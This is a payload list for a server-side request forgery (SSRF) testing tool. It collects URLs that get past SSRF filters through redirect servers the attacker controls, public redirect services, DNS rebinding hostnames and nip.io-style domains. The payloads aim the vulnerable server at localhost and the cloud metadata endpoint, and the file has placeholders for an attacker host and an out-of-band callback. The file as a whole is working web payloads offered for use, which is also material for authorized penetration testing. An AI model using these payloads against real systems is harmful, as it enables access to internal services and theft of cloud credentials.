# redirect-rebind.txt
# Filter bypass via HTTP redirects and DNS rebinding (-mode ssrf).
# Idea: the filter validates ONLY the initial URL (sees a "good" domain),
# then the server follows a redirect / hits a rebound internal IP.
# Placeholders: {{OOB}}, {{LHOST}}, {{TARGET}}
# Lines starting with # and blank lines are ignored.

# ---------- Your own redirect server ----------
# Host a page on {{LHOST}} returning 302/307/308 Location: http://127.0.0.1 (or metadata).
# 307/308 preserve method and body after the redirect.
http://{{LHOST}}/redirect?url=http://127.0.0.1
http://{{LHOST}}/redirect?url=http://169.254.169.254/latest/meta-data/
http://{{LHOST}}/redirect?url=http://{{TARGET}}

# ---------- r3dir.me (public seamless-redirect service) ----------
https://307.r3dir.me/--to/?url=http://localhost
https://307.r3dir.me/--to/?url=http://127.0.0.1
https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
https://308.r3dir.me/--to/?url=http://{{TARGET}}
https://302.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/

# ---------- DNS rebinding (1u.ms) ----------
# Alternates two IPs between consecutive resolves: the filter sees the external
# one, the server hits the internal one on the real connect.
# Format: make-A.B.C.D-rebind-E.F.G.H-rr.1u.ms
http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms/latest/meta-data/
http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms/
http://make-8.8.8.8-rebind-127.0.0.1-rr.1u.ms/

# ---------- nip.io / sslip.io as a "legit" external domain resolving inward ----------
http://169.254.169.254.nip.io/latest/meta-data/
http://127.0.0.1.nip.io/
http://{{TARGET}}.nip.io/

# ---------- OOB redirect to check whether the server follows Location ----------
http://{{OOB}}/redirect-check
